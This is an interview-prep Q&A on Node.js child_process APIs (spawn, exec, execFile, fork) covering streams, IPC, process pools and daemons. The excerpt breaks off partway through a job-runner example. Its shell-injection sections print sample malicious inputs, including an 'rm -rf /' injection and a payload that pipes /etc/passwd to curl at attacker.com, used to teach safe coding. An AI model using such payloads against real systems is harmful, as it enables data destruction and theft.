# Node.js `child_process`: `fork`, `spawn`, `exec` — Interview Q&A (5 YOE Level)

---

## Section 1: Fundamentals

**Q1. Why does Node.js need `child_process` at all — isn't Worker Threads enough for parallelism?**

A: `child_process` and Worker Threads solve different problems. Worker Threads provide in-process parallelism for JavaScript — multiple V8 contexts in the same OS process, sharing memory via `SharedArrayBuffer`. `child_process` launches entirely separate OS processes, each with their own memory space, their own Node.js runtime (or any other executable), and their own stdin/stdout/stderr.

The reasons you reach for `child_process` over Worker Threads:

```
┌─────────────────────────────────────────────────────────────────┐
│               When to use child_process                         │
│                                                                 │
│  1. Run a non-JS executable                                     │
│     ffmpeg, ImageMagick, Python scripts, shell commands         │
│     → Worker Threads can't run non-JS code                      │
│                                                                 │
│  2. True process isolation                                       │
│     A crash in the child doesn't kill the parent               │
│     → Worker Thread crashes can corrupt shared memory           │
│                                                                 │
│  3. Leverage shell features                                     │
│     Pipes, glob expansion, environment variables                │
│     → exec() runs commands through /bin/sh                      │
│                                                                 │
│  4. Separate Node.js processes with IPC                         │
│     fork() gives you a child Node.js process with a            │
│     built-in message channel — cluster uses this internally     │
│                                                                 │
│  5. Security sandboxing                                         │
│     Run untrusted code in a child with restricted env/uid       │
│     → Separate process boundary contains damage                  │
└─────────────────────────────────────────────────────────────────┘
```

The four APIs in `child_process`:

```javascript
import { spawn, exec, execFile, fork } from 'child_process';

// spawn(command, args, options)
// — launches any executable with argument array
// — streams stdin/stdout/stderr (no buffering)
// — no shell by default

// exec(command, options, callback)
// — runs command string through a shell (/bin/sh or cmd.exe)
// — buffers ALL output in memory
// — callback-based

// execFile(file, args, options, callback)
// — like exec but no shell — slightly faster and safer
// — buffers ALL output in memory
// — callback-based

// fork(modulePath, args, options)
// — spawn specialized for Node.js scripts
// — automatically sets up an IPC channel for .send()/.on('message')
// — inherits NODE_PATH, resolves require() correctly
```

The relationship between them:

```
spawn()     ← the primitive; all others build on it
exec()      ← spawn() + shell: true + output buffering + callback
execFile()  ← spawn() + output buffering + callback (no shell)
fork()      ← spawn() + node binary + IPC channel enabled
```

**Q2. What are child process streams and how does stdio work?**

A: Every child process has three standard I/O streams: `stdin` (writable — you write to the child), `stdout` (readable — you read what the child outputs), and `stderr` (readable — you read the child's error output). These are full Node.js streams with all the backpressure and event semantics from the streams API.

```javascript
import { spawn } from 'child_process';

const child = spawn('cat', []);
// child.stdin  → Writable stream  (write to the child's standard input)
// child.stdout → Readable stream  (read the child's standard output)
// child.stderr → Readable stream  (read the child's standard error)
// child.pid    → number           (OS process ID)
// child.exitCode → number | null  (null until process exits)

// Write to child's stdin:
child.stdin.write('hello from parent\n');
child.stdin.end(); // Signal end of input

// Read from child's stdout (streams API — event-driven):
child.stdout.on('data', (chunk: Buffer) => {
    console.log('Child said:', chunk.toString());
});

// Always handle stderr:
child.stderr.on('data', (chunk: Buffer) => {
    console.error('Child error:', chunk.toString());
});

// Process lifecycle events:
child.on('error', (err) => {
    // Fires if the process could not be spawned (e.g., command not found)
    // Does NOT fire for non-zero exit codes
    console.error('Failed to start child process:', err.message);
});

child.on('exit', (code, signal) => {
    // code:   exit code (0 = success), null if killed by signal
    // signal: signal name ('SIGTERM', etc.), null if exited normally
    console.log(`Child exited with code ${code}, signal ${signal}`);
});

child.on('close', (code, signal) => {
    // Like 'exit' but fires AFTER all stdio streams are closed
    // 'exit' can fire while stdout is still being read
    // For correctness, always prefer 'close' over 'exit'
    console.log(`All streams closed. Code: ${code}`);
});
```

The `stdio` option controls how streams are configured:

```javascript
// stdio: 'pipe' (default) — create streams on child.stdin/stdout/stderr
spawn('ls', ['-la'], { stdio: 'pipe' });

// stdio: 'inherit' — child shares parent's terminal (no stream objects on child)
spawn('npm', ['install'], { stdio: 'inherit' });
// Child's output goes directly to your terminal — great for interactive tools

// stdio: 'ignore' — discard all I/O (/dev/null)
spawn('daemon', [], { stdio: 'ignore', detached: true });

// stdio: array — configure each fd independently
spawn('node', ['script.js'], {
    stdio: ['pipe', 'pipe', 'inherit']
    //       stdin   stdout   stderr → stderr goes to terminal, others are pipes
});

// stdio: 'ipc' — add a 4th fd for IPC (fork() does this automatically)
spawn('node', ['worker.js'], { stdio: ['pipe', 'pipe', 'pipe', 'ipc'] });
```

## Section 2: `spawn`

**Q3. When should you use `spawn` and what makes it different from `exec`?**

A: `spawn` is the right choice whenever you need to handle large output, stream data continuously, or pass complex arguments without shell injection risk. It does not buffer output — data arrives as stream events as the child produces it:

```typescript
import { spawn } from 'child_process';
import { pipeline } from 'stream/promises';
import fs from 'fs';

// Good use cases for spawn:

// 1. Large output — ffmpeg transcoding (output could be gigabytes):
function transcodeVideo(input: string, output: string): Promise<void> {
    return new Promise((resolve, reject) => {
        const ffmpeg = spawn('ffmpeg', [
            '-i', input,
            '-codec:v', 'libx264',
            '-preset', 'slow',
            '-crf', '22',
            output
        ]);

        // ffmpeg writes progress to stderr — capture it without buffering
        ffmpeg.stderr.on('data', (chunk: Buffer) => {
            const line = chunk.toString();
            if (line.includes('frame=')) {
                process.stdout.write(`\r${line.trim()}`); // Live progress
            }
        });

        ffmpeg.on('close', (code) => {
            if (code === 0) resolve();
            else reject(new Error(`ffmpeg exited with code ${code}`));
        });

        ffmpeg.on('error', reject);
    });
}

// 2. Piping output — process grep output through your own transform:
async function grepStream(pattern: string, filePath: string): Promise<string[]> {
    const grep = spawn('grep', ['-n', pattern, filePath]);
    const results: string[] = [];

    for await (const chunk of grep.stdout) {
        const lines = (chunk as Buffer).toString().split('\n').filter(Boolean);
        results.push(...lines);
    }

    return results;
}

// 3. Long-running process — tail a log file:
function tailLog(logPath: string, onLine: (line: string) => void): () => void {
    const tail = spawn('tail', ['-f', logPath]);
    let buffer = '';

    tail.stdout.on('data', (chunk: Buffer) => {
        buffer += chunk.toString();
        const lines = buffer.split('\n');
        buffer = lines.pop() ?? ''; // Keep incomplete last line
        lines.forEach(onLine);
    });

    // Return cleanup function
    return () => tail.kill('SIGTERM');
}

// 4. User input passed as arguments — no shell injection risk:
function runPythonScript(scriptPath: string, args: string[]): ChildProcess {
    // args comes from user input — safe with spawn because no shell interpretation
    // If this were exec(`python ${scriptPath} ${args.join(' ')}`), an arg like
    // '; rm -rf /' would be executed as a shell command
    return spawn('python3', [scriptPath, ...args]);
    // spawn passes args as an array directly to execvp() — no shell involved
}
```

`spawn` with the `shell: true` option behaves like `exec` (runs through a shell), but still gives you streams. Use this only when you actually need shell features:

```javascript
// shell: true — enables shell features (pipes, globbing, env expansion)
// but reintroduces injection risk if args come from user input
const child = spawn('ls *.js | wc -l', [], { shell: true });

// Shell pipeline — only possible with shell: true or exec():
const child2 = spawn('cat /var/log/syslog | grep ERROR | tail -100', [], { shell: true });
```

**Q4. How do you pipe streams between the parent and a child process?**

A: Since `child.stdout` and `child.stdin` are standard Node.js streams, you can pipe them with `pipeline()` just like any other stream:

```typescript
import { spawn } from 'child_process';
import { pipeline } from 'stream/promises';
import fs from 'fs';
import zlib from 'zlib';

// Pipe a file through a child process command:
async function sortAndCompress(inputPath: string, outputPath: string): Promise<void> {
    const sortProcess = spawn('sort', ['--parallel=4', '--buffer-size=1G']);

    await Promise.all([
        // Feed input file into sort's stdin:
        pipeline(
            fs.createReadStream(inputPath),
            sortProcess.stdin
        ),
        // Take sort's stdout, gzip it, write to output:
        pipeline(
            sortProcess.stdout,
            zlib.createGzip(),
            fs.createWriteStream(outputPath)
        ),
        // Wait for sort to finish:
        new Promise<void>((resolve, reject) => {
            sortProcess.on('close', (code) => {
                if (code === 0) resolve();
                else reject(new Error(`sort exited with code ${code}`));
            });
            sortProcess.on('error', reject);
        })
    ]);
}

// Chaining multiple child processes — pipe between them directly using stdio:
function spawnPipeline(): Promise<string> {
    // Shell equivalent: cat /etc/passwd | cut -d: -f1 | sort | uniq
    const cat  = spawn('cat',  ['/etc/passwd']);
    const cut  = spawn('cut',  ['-d:', '-f1']);
    const sort = spawn('sort', []);
    const uniq = spawn('uniq', []);

    // Connect the chain:
    cat.stdout.pipe(cut.stdin);
    cut.stdout.pipe(sort.stdin);
    sort.stdout.pipe(uniq.stdin);

    return new Promise((resolve, reject) => {
        const chunks: Buffer[] = [];
        uniq.stdout.on('data', (chunk: Buffer) => chunks.push(chunk));
        uniq.on('close', (code) => {
            if (code === 0) resolve(Buffer.concat(chunks).toString());
            else reject(new Error(`Pipeline failed with code ${code}`));
        });

        // Handle errors on any process in the chain:
        [cat, cut, sort, uniq].forEach(proc => proc.on('error', reject));
    });
}

// Using stdio: ['pipe', 'pipe', 'inherit'] to pass stderr to terminal
// while keeping stdin/stdout as pipes:
const child = spawn('node', ['process-data.js'], {
    stdio: ['pipe', 'pipe', 'inherit'] // stderr goes directly to terminal
});
```

## Section 3: `exec` and `execFile`

**Q5. What does `exec` do and when should you use it?**

A: `exec` runs a command string through the system shell (`/bin/sh` on Unix, `cmd.exe` on Windows). It buffers all stdout and stderr in memory and delivers them via a callback when the process exits. It's designed for short-lived commands with bounded, small output:

```typescript
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

// Basic usage — shell features available (pipes, redirects, glob):
exec('ls -la | grep ".js" | wc -l', (err, stdout, stderr) => {
    if (err) {
        // err.code    → exit code
        // err.signal  → signal that killed the process (if any)
        // err.killed  → true if killed by timeout
        console.error('Command failed:', stderr);
        return;
    }
    console.log('JS file count:', stdout.trim());
});

// Promisified (preferred in async code):
async function getGitBranch(): Promise<string> {
    const { stdout } = await execAsync('git rev-parse --abbrev-ref HEAD');
    return stdout.trim(); // stdout includes trailing newline — always trim
}

async function runMigrations(dbUrl: string): Promise<void> {
    // Shell features: environment variable substitution
    const { stdout, stderr } = await execAsync(
        'npx prisma migrate deploy',
        {
            env: { ...process.env, DATABASE_URL: dbUrl },
            cwd: '/app',              // Working directory for the command
            timeout: 60_000,          // Kill if not done in 60s
            maxBuffer: 10 * 1024 * 1024, // 10MB max output (default: 1MB)
        }
    );
    console.log(stdout);
    if (stderr) console.warn('Warnings:', stderr);
}

// What exec() is good for:
// - npm scripts, git commands, simple shell utilities
// - Commands where you know output is small (< a few MB)
// - Commands that need shell features (pipes, ||, &&, glob)
// - One-off DevOps/admin tasks, not hot request paths

// What exec() is BAD for:
// - Large output (stdout/stderr buffered in RAM — can OOM)
// - User-supplied input in the command string (shell injection!)
// - Long-running processes (no streaming — all or nothing)
// - High-frequency calls (shell startup overhead per call)
```

The shell injection danger with `exec`:

```javascript
// DANGEROUS: user input in exec command string
app.get('/search', async (req, res) => {
    const { query } = req.query;
    // query = "hello; rm -rf /; echo"
    const { stdout } = await execAsync(`grep -r "${query}" /var/log/app`);
    //                                          ↑ Shell interprets this!
    // Resulting shell command:  grep -r "hello; rm -rf /; echo" /var/log/app
    // The shell sees:           grep -r "hello"; rm -rf /; echo "" /var/log/app
    //                                          ↑ Three separate commands!
    res.json({ results: stdout });
});

// SAFE: use execFile() or spawn() with argument array instead:
import { execFile } from 'child_process';
const execFileAsync = promisify(execFile);

app.get('/search', async (req, res) => {
    const { query } = req.query as { query: string };
    // query passed as a single argument — shell never sees it
    const { stdout } = await execFileAsync('grep', ['-r', query, '/var/log/app']);
    res.json({ results: stdout });
});
```

**Q6. What is `execFile` and when does it have an advantage over `exec`?**

A: `execFile` is like `exec` without the shell. It executes a file directly (via `execvp` on Unix), bypassing shell interpretation. This makes it:
- **Safer**: no shell means no injection — arguments are passed as-is
- **Faster**: no shell startup overhead (~5-10ms per call)
- **More predictable**: behavior doesn't depend on the shell's version or config

```typescript
import { execFile } from 'child_process';
import { promisify } from 'util';

const execFileAsync = promisify(execFile);

// execFile: file + args array, no shell
async function resizeImage(
    inputPath: string,
    outputPath: string,
    width: number,
    height: number
): Promise<void> {
    // Arguments are passed directly — no shell injection possible
    // Even if inputPath = 'file.jpg; rm -rf /', it's treated as a literal filename
    const { stderr } = await execFileAsync('convert', [
        inputPath,
        '-resize', `${width}x${height}`,
        '-quality', '85',
        outputPath
    ]);
    if (stderr) console.warn('ImageMagick warnings:', stderr);
}

// exec vs execFile comparison:
import { exec } from 'child_process';

// exec: runs through shell — can use shell features
exec('wc -l < /var/log/app.log', callback);  // Shell input redirection works

// execFile: no shell — must pass the actual executable, not shell builtins
execFile('wc', ['-l', '/var/log/app.log'], callback); // Must pass file as arg instead

// execFile cannot use shell built-ins directly:
execFile('echo', ['hello'], callback);  // Works — /bin/echo exists
execFile('cd', ['/tmp'], callback);     // Error! 'cd' is a shell built-in, not a file

// execFile with shell: true defeats the purpose — don't do it:
execFile('ls', ['-la'], { shell: true }, callback); // Now you have a shell again — use exec()

// Key decision guide:
// Need shell features (pipes, &&, ||, glob, redirects)? → exec()
// Running a specific file with user-supplied args?       → execFile()
// Know the exact executable, want streaming?             → spawn()
// Spawning another Node.js script?                       → fork()
```

## Section 4: `fork`

**Q7. What does `fork` do that `spawn` doesn't, and how does the IPC channel work?**

A: `fork` is `spawn` specialized for Node.js child processes. It automatically:
- Uses the current Node.js executable
- Sets up a serialized **IPC channel** between parent and child on a dedicated file descriptor
- Exposes `.send(message)` and `.on('message', handler)` on both sides

The IPC channel is the key differentiator — it's a structured message-passing interface, not raw bytes:

```javascript
// parent.js
import { fork } from 'child_process';
import path from 'path';

const child = fork(path.resolve(__dirname, 'child.js'));
//                 ↑ module path, not a shell command string

// Send a message to the child — automatically JSON-serialized
child.send({ type: 'task', data: { userId: 123 } });

// Receive messages from the child:
child.on('message', (msg) => {
    console.log('Child replied:', msg);
    // msg is already deserialized — received as a JS object
});

// IPC channel events:
child.on('disconnect', () => {
    // IPC channel closed — no more messages possible
    console.log('IPC channel disconnected');
});

// Explicitly close the IPC channel (child can exit independently after this):
child.disconnect();

// child.js
process.on('message', (msg) => {
    console.log('Parent sent:', msg);
    const result = heavyComputation(msg.data);
    process.send({ type: 'result', data: result }); // Reply to parent
});

// Disconnect from parent when done (allows child to exit naturally):
process.on('disconnect', () => {
    process.exit(0);
});
```

What travels over the IPC channel:

```javascript
// Messages are serialized with v8.serialize() (not JSON.stringify)
// v8.serialize() handles more types than JSON:
child.send({ date: new Date() });          // Date objects — works
child.send({ map: new Map([['a', 1]]) });  // Maps — works
child.send({ buf: Buffer.from('hello') }); // Buffers — works
child.send({ fn: () => {} });              // Functions — NOT supported (silently dropped)
child.send({ regex: /hello/ });            // RegExp — works
child.send(undefined);                     // undefined — NOT supported (error)

// Large messages are expensive — IPC is not designed for large data transfer
// For large data between Node.js processes: use SharedArrayBuffer or temp files
// For small control messages: IPC is ideal

// Sending a handle over IPC (advanced):
// fork() can pass net.Server or net.Socket objects between processes
// This is how cluster module distributes connections to workers
import net from 'net';
const server = net.createServer();
server.listen(8080, () => {
    child.send('server', server); // Pass server handle to child!
    // Now both parent and child can accept connections on port 8080
});
```

**Q8. How does `fork` compare to Worker Threads for CPU-bound work?**

A: Both solve CPU-bound parallelism but with different trade-offs. The choice depends on how much data you need to share and what isolation you need:

```
┌──────────────────────────┬──────────────────────────┐
│      Worker Threads       │     fork() / cluster      │
├──────────────────────────┼──────────────────────────┤
│ Same process              │ Separate OS processes     │
│ Shared memory available   │ No shared memory (IPC)   │
│ SharedArrayBuffer + Atomics│ JSON/v8 messages only   │
│ Lower startup overhead    │ ~30-100ms startup         │
│ ~1MB memory overhead      │ ~30MB per process (V8)   │
│ Crash can corrupt parent  │ Crash is isolated         │
│ Good for: tight loops,    │ Good for: long-lived      │
│ data processing,          │ workers, server clusters, │
│ WebAssembly               │ mixed-language pipelines  │
└──────────────────────────┴──────────────────────────┘
```

```typescript
// Worker Thread approach — shared memory, low overhead:
import { Worker, isMainThread, parentPort, workerData } from 'worker_threads';

if (isMainThread) {
    const sharedBuffer = new SharedArrayBuffer(4);
    const counter = new Int32Array(sharedBuffer);

    const worker = new Worker(__filename, { workerData: { sharedBuffer } });
    worker.on('message', () => {
        console.log('Counter from worker:', Atomics.load(counter, 0));
    });
} else {
    const counter = new Int32Array(workerData.sharedBuffer);
    Atomics.add(counter, 0, 1); // Increment shared counter
    parentPort!.postMessage('done');
}

// fork() approach — full isolation, IPC messages:
// parent.js
import { fork } from 'child_process';

const worker = fork('./worker.js');
const data = generateLargeDataset(); // 10MB of data

// Sending 10MB over IPC: serialized, copied, deserialized — expensive
worker.send({ task: 'process', data });

worker.on('message', ({ result }) => {
    console.log('Result:', result);
});

// For large data with fork: better to write to a temp file and pass the path
import { writeFileSync } from 'fs';
const tmpFile = `/tmp/task-${Date.now()}.json`;
writeFileSync(tmpFile, JSON.stringify(data));
worker.send({ task: 'process', filePath: tmpFile }); // Cheap — just a string
```

When to prefer `fork` over Worker Threads:

```javascript
// 1. The child needs to require() native modules or has its own dependencies
//    that would conflict with the parent's module graph

// 2. You want a crash in the computation to not affect the parent process at all

// 3. You're building a process pool where each worker handles many requests
//    and you want OS-level scheduling between them

// 4. The child process is long-lived and needs to be restarted independently
fork('./worker.js', [], {
    env: { ...process.env, WORKER_ID: '1' }, // Each worker gets its own config
    execArgv: ['--max-old-space-size=4096'],  // Per-worker V8 heap limit
});

// When to prefer Worker Threads:
// 1. Short-lived computation (< 100ms) — fork startup cost dominates
// 2. Need to share large arrays without copying (SharedArrayBuffer)
// 3. Memory is constrained — each forked process adds ~30MB baseline
// 4. Many concurrent tasks — 100 worker threads is fine; 100 forked processes is heavy
```

## Section 5: Process Management

**Q9. How do you handle child process errors, exit codes, and timeouts correctly?**

A: Child process error handling has several distinct failure modes that require separate handling. Mixing them up leads to unhandled rejections or silent failures:

```typescript
import { spawn, exec } from 'child_process';
import { promisify } from 'util';

// The three distinct failure modes for child processes:
// 1. spawn error    — process could not be started (ENOENT, EACCES)
// 2. non-zero exit  — process started and ran, but reported failure
// 3. timeout        — process ran too long and was killed

// Robust spawn wrapper:
function spawnAsync(
    command: string,
    args: string[],
    options: { timeout?: number; maxOutputBytes?: number } = {}
): Promise<{ stdout: string; stderr: string; code: number }> {
    return new Promise((resolve, reject) => {
        const child = spawn(command, args);

        const stdoutChunks: Buffer[] = [];
        const stderrChunks: Buffer[] = [];
        let totalBytes = 0;
        const maxBytes = options.maxOutputBytes ?? 10 * 1024 * 1024; // 10MB default

        child.stdout.on('data', (chunk: Buffer) => {
            totalBytes += chunk.length;
            if (totalBytes > maxBytes) {
                child.kill('SIGTERM');
                reject(new Error(`Output exceeded ${maxBytes} byte limit`));
                return;
            }
            stdoutChunks.push(chunk);
        });

        child.stderr.on('data', (chunk: Buffer) => stderrChunks.push(chunk));

        // 'error' event: process failed to spawn (command not found, permission denied)
        // This fires INSTEAD of 'close' in this case
        child.on('error', (err: NodeJS.ErrnoException) => {
            if (err.code === 'ENOENT') {
                reject(new Error(`Command not found: ${command}`));
            } else if (err.code === 'EACCES') {
                reject(new Error(`Permission denied: ${command}`));
            } else {
                reject(err);
            }
        });

        // 'close' fires after all stdio is flushed (safer than 'exit')
        child.on('close', (code, signal) => {
            const stdout = Buffer.concat(stdoutChunks).toString('utf8');
            const stderr = Buffer.concat(stderrChunks).toString('utf8');

            if (signal) {
                // Process was killed by a signal (SIGTERM, SIGKILL, etc.)
                reject(new Error(`Process killed by signal ${signal}\nstderr: ${stderr}`));
                return;
            }

            // Resolve with result regardless of exit code —
            // let the caller decide if non-zero is an error
            resolve({ stdout, stderr, code: code ?? 1 });
        });

        // Timeout handling:
        if (options.timeout) {
            const timer = setTimeout(() => {
                child.kill('SIGTERM'); // Polite kill — gives process a chance to clean up
                setTimeout(() => {
                    // If still running after 5s, force kill
                    if (!child.killed) child.kill('SIGKILL');
                }, 5000);
                reject(new Error(`Process timed out after ${options.timeout}ms`));
            }, options.timeout);

            child.on('close', () => clearTimeout(timer));
        }
    });
}

// Usage:
const { stdout, code } = await spawnAsync('git', ['log', '--oneline', '-10']);
if (code !== 0) throw new Error(`git log failed`);
console.log(stdout);

// exec timeout (built-in):
const execAsync = promisify(exec);
try {
    await execAsync('slow-command', { timeout: 5000 });
} catch (err: any) {
    if (err.killed) {
        console.error('Command timed out'); // err.killed is true when timeout fires
    }
}
```

**Q10. How do you build a process pool with `fork` for CPU-bound work?**

A: A process pool pre-forks N worker processes and distributes tasks across them, reusing each process for multiple tasks rather than paying the fork startup cost per task:

```typescript
import { fork, ChildProcess } from 'child_process';
import path from 'path';

interface Task<T, R> {
    data: T;
    resolve: (result: R) => void;
    reject: (err: Error) => void;
}

class ForkPool<TInput, TOutput> {
    private workers: ChildProcess[] = [];
    private idle: ChildProcess[] = [];
    private queue: Task<TInput, TOutput>[] = [];
    private taskMap = new Map<ChildProcess, Task<TInput, TOutput>>();

    constructor(
        private readonly workerPath: string,
        private readonly size: number
    ) {
        for (let i = 0; i < size; i++) {
            this.addWorker();
        }
    }

    private addWorker(): void {
        const worker = fork(this.workerPath);

        worker.on('message', (result: { success: true; data: TOutput } | { success: false; error: string }) => {
            const task = this.taskMap.get(worker);
            if (!task) return;
            this.taskMap.delete(worker);

            if (result.success) {
                task.resolve(result.data);
            } else {
                task.reject(new Error(result.error));
            }

            // Worker is free — pick up next queued task or mark idle
            this.idle.push(worker);
            this.drain();
        });

        worker.on('error', (err) => {
            const task = this.taskMap.get(worker);
            this.taskMap.delete(worker);
            task?.reject(err);

            // Replace crashed worker with a fresh one
            this.workers = this.workers.filter(w => w !== worker);
            this.idle = this.idle.filter(w => w !== worker);
            this.addWorker();
            this.drain();
        });

        worker.on('exit', (code) => {
            if (code !== 0) {
                // Worker crashed — same as error handling above
                this.workers = this.workers.filter(w => w !== worker);
                this.idle = this.idle.filter(w => w !== worker);
                this.addWorker();
                this.drain();
            }
        });

        this.workers.push(worker);
        this.idle.push(worker);
    }

    private drain(): void {
        while (this.queue.length > 0 && this.idle.length > 0) {
            const task = this.queue.shift()!;
            const worker = this.idle.pop()!;
            this.taskMap.set(worker, task);
            worker.send(task.data);
        }
    }

    run(data: TInput): Promise<TOutput> {
        return new Promise((resolve, reject) => {
            this.queue.push({ data, resolve, reject });
            this.drain();
        });
    }

    async shutdown(): Promise<void> {
        // Wait for all in-flight tasks to complete, then kill workers
        await Promise.all(
            Array.from(this.taskMap.values()).map(
                task => new Promise(resolve => {
                    const original = task.resolve;
                    task.resolve = (result) => { original(result); resolve(undefined); };
                })
            )
        );
        this.workers.forEach(w => w.kill('SIGTERM'));
    }
}

// worker.js — receives tasks, returns results:
process.on('message', async (data: { numbers: number[] }) => {
    try {
        const result = data.numbers.reduce((sum, n) => sum + Math.sqrt(n), 0);
        process.send!({ success: true, data: result });
    } catch (err: any) {
        process.send!({ success: false, error: err.message });
    }
});

// Usage:
const pool = new ForkPool<{ numbers: number[] }, number>('./worker.js', 4);

const results = await Promise.all([
    pool.run({ numbers: Array.from({ length: 1_000_000 }, (_, i) => i) }),
    pool.run({ numbers: Array.from({ length: 1_000_000 }, (_, i) => i * 2) }),
    pool.run({ numbers: Array.from({ length: 1_000_000 }, (_, i) => i * 3) }),
]);
// All 3 tasks run in parallel across 4 workers — main thread stays free
```

## Section 6: Security and Advanced Patterns

**Q11. What are the security considerations when using `exec` with user-supplied input?**

A: Shell injection is the primary risk — any user input concatenated into a shell command string becomes an attack surface. The fix is almost always to use `spawn` or `execFile` with an argument array instead:

```typescript
import { exec, execFile, spawn } from 'child_process';
import { promisify } from 'util';

// VULNERABLE — never do this:
app.post('/convert', async (req, res) => {
    const filename = req.body.filename;
    // filename = "innocent.jpg; cat /etc/passwd | curl http://attacker.com -d @-"
    const { stdout } = await promisify(exec)(`convert ${filename} output.png`);
    //                                                 ↑ Shell executes all of this!
    res.json({ result: stdout });
});

// SAFE — spawn with argument array:
app.post('/convert', async (req, res) => {
    const filename = req.body.filename;

    // Additional input validation — even with spawn, validate inputs
    if (!/^[\w\-. ]+\.(jpg|png|gif|webp)$/i.test(filename)) {
        return res.status(400).json({ error: 'Invalid filename' });
    }

    // filename is passed as a single argument — shell never sees it
    const child = spawn('convert', [filename, 'output.png']);
    const chunks: Buffer[] = [];

    child.stderr.on('data', chunk => chunks.push(chunk));
    child.on('close', (code) => {
        if (code !== 0) {
            const errMsg = Buffer.concat(chunks).toString();
            return res.status(500).json({ error: errMsg });
        }
        res.json({ result: 'converted' });
    });
    child.on('error', err => res.status(500).json({ error: err.message }));
});

// When you MUST use exec() with variable data — sanitize with shell-escape:
import shellEscape from 'shell-escape'; // npm package

app.post('/grep', async (req, res) => {
    const pattern = req.body.pattern;

    // shell-escape wraps each argument in single quotes and escapes internal quotes
    const safePattern = shellEscape([pattern]); // "hello; rm -rf /" → "'hello; rm -rf /'"
    const { stdout } = await promisify(exec)(`grep -r ${safePattern} /var/log/app`);
    //                                              ↑ Safely quoted — treated as literal
    res.json({ results: stdout.split('\n') });
});
// But even this is risky — shell-escape libraries have edge cases.
// Prefer spawn/execFile with argument arrays whenever possible.

// Additional hardening for child processes:
spawn('risky-tool', ['--process', userInput], {
    env: {
        PATH: '/usr/bin:/bin', // Minimal PATH — no user-controlled directories
        // Don't inherit parent's full env — could leak secrets
    },
    uid: 65534,  // Run as 'nobody' user (Unix only)
    gid: 65534,
    cwd: '/tmp/sandbox', // Restrict working directory
});
```

**Q12. How do you run a child process detached — as a daemon that outlives the parent?**

A: By default, child processes are tied to the parent — when the parent exits, children receive SIGHUP. To run a truly independent daemon:

```typescript
import { spawn } from 'child_process';
import fs from 'fs';

function spawnDaemon(command: string, args: string[], logFile: string): number {
    const logFd = fs.openSync(logFile, 'a'); // Open log file for appending

    const daemon = spawn(command, args, {
        detached: true,    // Child becomes a process group leader — survives parent exit
        stdio: [
            'ignore',      // stdin:  child has no input (daemon behavior)
            logFd,         // stdout: redirect to log file
            logFd,         // stderr: redirect to log file
        ],
    });

    // Critical: unref() tells Node.js not to keep the event loop alive for this child
    // Without unref(), parent process won't exit while child is running
    daemon.unref();

    fs.closeSync(logFd); // Parent doesn't need the fd open anymore

    return daemon.pid!; // Return PID so caller can manage the daemon
}

// Usage:
const pid = spawnDaemon(
    'node',
    ['background-worker.js', '--queue', 'emails'],
    '/var/log/email-worker.log'
);
console.log(`Daemon started with PID ${pid}`);
// Parent process exits immediately — daemon continues running

// Stopping a daemon by PID:
function stopDaemon(pid: number): void {
    try {
        process.kill(pid, 'SIGTERM'); // Graceful shutdown
    } catch (err: any) {
        if (err.code !== 'ESRCH') throw err; // ESRCH = no such process — already dead
    }
}

// Check if a daemon is still running:
function isDaemonRunning(pid: number): boolean {
    try {
        process.kill(pid, 0); // Signal 0 = check existence, don't actually send signal
        return true;
    } catch {
        return false; // Process doesn't exist or no permission
    }
}
```

## Section 7: Scenario-Based Questions

**Q13. "What's wrong with this code? We're seeing memory issues under load."**

```javascript
app.post('/thumbnail', async (req, res) => {
    const imagePath = req.body.path;
    const { stdout } = await execAsync(
        `convert ${imagePath} -resize 200x200 -`
    );
    res.set('Content-Type', 'image/jpeg');
    res.send(stdout);
});
```

A: Three bugs — one security, one memory, one data corruption:

```typescript
// Bug 1: Shell injection — imagePath from user input directly in exec string
// imagePath = "photo.jpg -resize 1x1 -; cat /etc/passwd"
// Attacker can run arbitrary commands

// Bug 2: Binary data through stdout string
// exec() collects stdout as a Buffer internally, but promisify(exec) returns
// { stdout: string } — the Buffer is converted to a string using the system's
// default encoding. JPEG is binary — string conversion corrupts it.
// High bytes (> 0x7F) become replacement characters → corrupted image

// Bug 3: All image data buffered in memory
// exec() buffers stdout with maxBuffer: 1MB default
// A large image → Error: maxBuffer exceeded
// Even with higher maxBuffer: every concurrent request holds the full image in RAM
// Under load: memory usage = (concurrent requests) × (image size)

// Fixed version:
import { spawn } from 'child_process';
import path from 'path';

app.post('/thumbnail', (req, res) => {
    const imagePath = req.body.path as string;

    // Fix 1: Validate and sanitize path — no shell injection
    const safePath = path.resolve('/var/images', path.basename(imagePath));
    if (!safePath.startsWith('/var/images/')) {
        return res.status(400).json({ error: 'Invalid path' });
    }

    // Fix 2: spawn with argument array — no shell involved
    const convert = spawn('convert', [
        safePath,
        '-resize', '200x200',
        '-'         // Output to stdout as binary
    ]);

    // Fix 3: stream binary output directly — never buffers entire image
    res.set('Content-Type', 'image/jpeg');
    convert.stdout.pipe(res); // Pipe binary data directly to HTTP response

    convert.stderr.on('data', (chunk: Buffer) => {
        console.error('convert stderr:', chunk.toString());
    });

    convert.on('error', (err) => {
        console.error('spawn error:', err);
        if (!res.headersSent) {
            res.status(500).json({ error: 'Conversion failed' });
        }
    });

    convert.on('close', (code) => {
        if (code !== 0 && !res.headersSent) {
            res.status(500).json({ error: `convert exited with code ${code}` });
        }
    });

    // Handle client disconnect — kill convert to avoid wasted CPU
    req.on('close', () => convert.kill('SIGTERM'));
});
```

**Q14. "Design a background job system where jobs run in isolated child processes, with a timeout, result capture, and retry on failure."**

A: Combining `fork` with IPC, timeouts, and retry logic:

```typescript
import { fork, ChildProcess } from 'child_process';
import path from 'path';

interface JobResult<T> {
    success: boolean;
    data?: T;
    error?: string;
    durationMs: number;
    attempts: number;
}

interface JobOptions {
    timeoutMs?: number;
    maxRetries?: number;
    retryDelayMs?: number;
}

async function runJob<TInput, TOutput>(
    workerPath: string,
    input: TInput,
    options: JobOptions = {}
): Promise<JobResult<TOutput>> {
    const {
        timeoutMs = 30_000,
        maxRetries = 3,
        retryDelayMs = 1000,
    } = options;

    let attempts = 0;
    const startTime = Date.now();

    while (attempts < maxRetries) {
        attempts++;

        try {
            const data = await runOnce<TInput, TOutput>(workerPath, input, timeoutMs);
            return {
                success: true,
                data,
                durationMs: Date.now() - startTime,
                attempts,
            };
        } catch (err: any) {
            console.warn(`Job attempt ${attempts} failed: ${err.message}`);

            if (attempts >= maxRetries) {
                return {
                    success: false,
                    error: err.message,
                    durationMs: Date.now() - startTime,
                    attempts,
                };
            }

            // Exponential backoff between retries
            const delay = retryDelayMs * Math.pow(2, attempts - 1);
